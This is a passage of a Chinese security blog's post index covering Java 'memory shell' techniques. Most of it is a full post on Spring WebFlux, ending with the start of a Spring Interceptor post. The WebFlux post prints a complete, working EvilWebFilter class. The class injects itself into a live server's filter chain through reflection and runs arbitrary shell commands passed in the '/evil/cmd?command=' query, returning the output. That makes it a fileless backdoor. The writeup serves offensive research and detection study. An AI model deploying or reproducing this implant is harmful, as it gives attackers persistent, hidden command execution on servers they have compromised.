      &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713772672628-3c77b64c-f2f0-47b7-b9ce-14d7e779c847.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Agent </tag>
            
            <tag> MemoryShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of WebFlux</title>
      <link href="/2024/05/19/Spring-WebFlux/"/>
      <url>/2024/05/19/Spring-WebFlux/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring框架中包含的原始Web框架Spring Web MVC是专门为Servlet API和Servlet容器构建的。响应式堆栈Web框架Spring WebFlux是在5.0版本中添加的，它完全非阻塞，支持Reactive Streams背压，运行在Netty、Undertow、Servlet容器等服务器上，它不依赖Servlet-API，但是同样具有Filter，即WebFilter。</p><p>WebFlux型内存马也算是一个变相的Filter类型的内存马，依旧还是通过动态注册WebFilter及映射路由来实现的，但是它的filters并没有存放在常见的filter集合中。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建一个SpringBoot项目，WEB选择Spring Reactive WEB。</p><p><img src="/2024/05/19/Spring-WebFlux/1713508782136-e0fab9c3-e439-4905-98c9-8305209ba126.png" alt="image.png"></p><ul><li>创建Handler类，用于请求处理</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.BodyInserters;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">hello</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ServerResponse.ok().contentType(MediaType.TEXT_PLAIN)</span><br><span class="line">                .body(BodyInserters.fromValue(<span class="string">&quot;Hello Webflux!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建Controller类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RequestPredicates;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunction;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunctions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingRouter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">route</span><span class="params">(GreetingHandler greetingHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.route(RequestPredicates.GET(<span class="string">&quot;/hello&quot;</span>).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-WebFlux/1713508910530-71fad0b9-5719-4463-ba12-83b927b72e61.png" alt="image.png"></p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>在GreetingHandler#hello方法中下断点，观察堆栈信息，发现org.springframework.web.reactive.DispatcherHandler#invokeHandler方法调用handle方法，根据URI分发处理handler。</p><p><img src="/2024/05/19/Spring-WebFlux/1713512244450-219aecb1-7e92-4965-89ec-41c85c5671a3.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-WebFlux/1713512304094-be898fef-d208-4d90-8dec-cd2ee83f3cbd.png" alt="image.png"></p><p>由于WebFlux型内存马注入，依旧是需要动态注册一个Filter及映射路由，对于路由创建一般有两种方式：</p><ol><li>通过提供的API进行调用，进而能够动态的创建内存马，例如Spring Controller型内存马，主要就是通过RequestMappingHandlerMapping#registerMapping方法进行动态的注册</li><li>通过反射的方法进行获取类似servlets&#x2F;filters等存放servlet&#x2F;filter的属性，之后将自定义的类添加进入这个属性中</li></ol><p>这里可以利用工具Java-Object-Searcher来查看自定义的WebFilter在Thread的哪个位置，从而确定注入点，自定义一个如下的WebFilter，接着访问路由，观察自定义的WebFilter在Thread的哪个位置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain)</span> &#123;</span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;MyWebFilter&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">15</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop/&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;MyWebFilter.....&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> webFilterChain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先在MyWebFilter中下个断点，观察堆栈信息，发现是从DefaultWebFilterChain#invokeFilter方法中来获取自定义的WebFilter的，因此在前面对象搜索的结果中搜索关键词DefaultWebFilterChain，得到如下的结果，完整的获取到了filter储存的位置。</p><p><img src="/2024/05/19/Spring-WebFlux/1713514797436-a98990c9-0d4b-4eb6-b083-c87a5e02ffb4.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [<span class="number">2</span>] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$<span class="number">1</span>&#125; </span><br><span class="line">      ---&gt; <span class="built_in">this</span>$<span class="number">0</span> = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; </span><br><span class="line">       ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; </span><br><span class="line">        ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; </span><br><span class="line">         ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; </span><br><span class="line">          ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; </span><br><span class="line">            ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; </span><br><span class="line">             ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125; </span><br><span class="line">              ---&gt; allFilters = &#123;java.util.List&lt;org.springframework.web.server.WebFilter&gt;&#125; </span><br><span class="line">               ---&gt; [<span class="number">0</span>] = &#123;com.example.webfluxmemoryshell.index.MyWebFilter&#125;</span><br></pre></td></tr></table></figure><p>从上文搜索结果中可以看到，所有filter都被储存在了chain属性里，然后chain属性是被存在FilteringWebHandler里面，要注入的话就得添加一个恶意的chain进去，至于为什么不添加一个Filter到allFilters属性中，可以参考<a href="https://xz.aliyun.com/t/11331?time__1311=mqmx0DyDBD9DniDcDBqQqO4+xpLrTWFKqwrID&alichlgref=https://www.google.com.hk/#toc-4:~:text=%22request%22">从CVE-2022-22947到Spring WebFlux内存马与哥斯拉</a>%3B-,Spring%20WebFilter%E5%86%85%E5%AD%98%E9%A9%AC,-%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0Controller)。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.netty.NettyWebServer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBufferFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.adapter.HttpWebHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.DefaultWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.ExceptionHandlingWebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.FilteringWebHandler;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (exchange.getRequest().getURI().getPath().startsWith(<span class="string">&quot;/evil/&quot;</span>)) &#123;</span><br><span class="line">            inject();</span><br><span class="line">            Flux&lt;DataBuffer&gt; response = getPost(exchange);</span><br><span class="line">            <span class="type">ServerHttpResponse</span> <span class="variable">serverHttpResponse</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">            <span class="keyword">return</span> serverHttpResponse.writeWith(response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getThreads</span> <span class="operator">=</span> Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">            getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">handler</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">httpHandler</span> <span class="operator">=</span> getFieldValue(handler,<span class="string">&quot;httpHandler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">HttpWebHandlerAdapter</span> <span class="variable">httpWebHandlerAdapter</span> <span class="operator">=</span> (HttpWebHandlerAdapter) getFieldValue(httpHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ExceptionHandlingWebHandler</span> <span class="variable">exceptionHandlingWebHandler</span> <span class="operator">=</span> (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> (DefaultWebFilterChain) getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    List&lt;WebFilter&gt; allFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">                    allFilters.add(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">EvilWebFilter</span>());</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, allFilters);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">                    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                    modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">                    f.set(filteringWebHandler, newChain);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName, <span class="type">boolean</span> superClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">if</span>(superClass)&#123;</span><br><span class="line">            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;DataBuffer&gt; <span class="title function_">getPost</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getURI().getQuery();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.equals(<span class="string">&quot;/evil/cmd&quot;</span>) &amp;&amp; query != <span class="literal">null</span> &amp;&amp; query.startsWith(<span class="string">&quot;command=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> query.substring(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            String line;</span><br><span class="line">                            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">                            &#125;</span><br><span class="line">                            sink.complete();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">                    <span class="keyword">return</span> response;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> Flux.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-WebFlux/1713518745557-17285471-7f80-4963-b5f3-2bd1b7cdeb0c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of Interceptor</title>
      <link href="/2024/05/19/Spring-Interceptor/"/>
      <url>/2024/05/19/Spring-Interceptor/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Interceptor和Tomcat Filter过滤器很类似，区别如下：</p><ul><li>Interceptor基于反射，Filter基于函数回调</li><li>Interceptor不依赖Servlet容器</li><li>Interceptor只能对Action请求有用</li><li>Interceptor可以访问Action上下文，栈里的对象，而Filter不能</li><li>Action生命周期中，Interceptor可以被多次调用，而Filter只在容器初始化时调用一次</li><li>Interceptor可以获取IOC容器中的Bean，而Filter不行</li></ul><p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作。</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>Interceptor拦截过程如下：</p><ul><li>程序先执行preHandle方法，如果该方法的返回值为true，则程序会继续向下执行处理器中的方法，否则将不再向下执行</li><li>控制器Controller类处理完请求后，会执行postHandle方法，然后会通过DispatcherServlet向客户端返回响应</li><li>在DispatcherServlet处理完请求后，才会执行afterCompletion方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截类</span></span><br><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 